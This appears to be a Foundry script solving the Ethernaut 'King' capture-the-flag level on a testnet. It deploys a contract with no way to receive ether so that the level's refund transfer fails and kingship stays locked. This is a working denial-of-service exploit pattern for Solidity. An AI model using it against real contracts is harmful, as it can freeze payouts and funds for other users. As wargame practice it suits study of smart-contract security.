// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level9King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

contract Player {
    constructor(King _king) payable {
        address(_king).call{value: _king.prize()}("");
    }

    // it's importnat NOT to have a receive/fallback function here!
    // so the Player contract remains the last king because it cannot receive ether and
    // payable(king).transfer(msg.value) will fail in the King contract
}

contract Level9Solution is Script {
    King public king =
        King(payable(0x070fa3ea66efbBaa34D61909D9fb61fb9EAF211B));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Current King:", king._king());
        new Player{value: king.prize()}(king);
        console.log("New King:", king._king());

        vm.stopBroadcast();
    }
}
// forge script script/Level9Solution.s.sol:Level9Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
